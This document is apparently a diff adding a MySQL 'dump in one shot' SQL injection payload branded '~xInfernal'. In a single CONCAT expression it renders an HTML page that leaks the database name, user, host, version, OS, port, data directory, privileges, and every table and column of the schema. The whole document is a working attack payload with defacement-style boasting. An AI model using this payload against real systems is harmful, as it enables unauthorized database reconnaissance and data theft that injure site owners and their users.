@@ -1,0 +1,37 @@
+CONCAT(
+  '<html><head><title>⛧ DIOS by ~xInfernal ⛧</title>',
+  '<style>',
+  'body{background:black;color:red;font-family:monospace;padding:20px;}',
+  'h1,h2{color:#ff0000;text-shadow:0 0 10px red;}',
+  'table{width:100%;border-collapse:collapse;margin-top:20px;}',
+  'th,td{border:1px solid red;padding:8px;text-align:left;}',
+  'th{background:#1a0000;}td{background:#0d0d0d;}',
+  'code{color:#ff8080;}',
+  '</style></head><body>',
+  '<h1>⛧ DIOS DATA DUMP ⛧</h1>',
+  '<h2>~xInfernal Owns This</h2>',
+  '<ul>',
+  '<li><b>Database:</b> ', database(), '</li>',
+  '<li><b>User:</b> ', user(), '</li>',
+  '<li><b>Host:</b> ', @@hostname, '</li>',
+  '<li><b>Version:</b> ', version(), '</li>',
+  '<li><b>OS:</b> ', @@version_compile_os, '</li>',
+  '<li><b>Port:</b> ', @@port, '</li>',
+  '<li><b>Data Dir:</b> ', @@datadir, '</li>',
+  '<li><b>SSL:</b> ', @@GLOBAL.have_ssl, '</li>',
+  '<li><b>Symlink:</b> ', @@GLOBAL.have_symlink, '</li>',
+  '<li><b>Privileges:</b><br>',
+    (SELECT GROUP_CONCAT(GRANTEE, ' → ', IS_GRANTABLE, '<br>') FROM INFORMATION_SCHEMA.USER_PRIVILEGES),
+  '</li>',
+  '</ul>',
+  '<h2>🩸 Table & Column Dump</h2>',
+  '<table><tr><th>Table</th><th>Column</th></tr>',
+  (SELECT GROUP_CONCAT(
+    CONCAT('<tr><td>', table_name, '</td><td>', column_name, '</td></tr>')
+    SEPARATOR ''
+  )
+  FROM information_schema.columns WHERE table_schema=database()),
+  '</table>',
+  '<br><center><code>Infernal Injection Success - ~xInfernal</code></center>',
+  '</body></html>'
+)
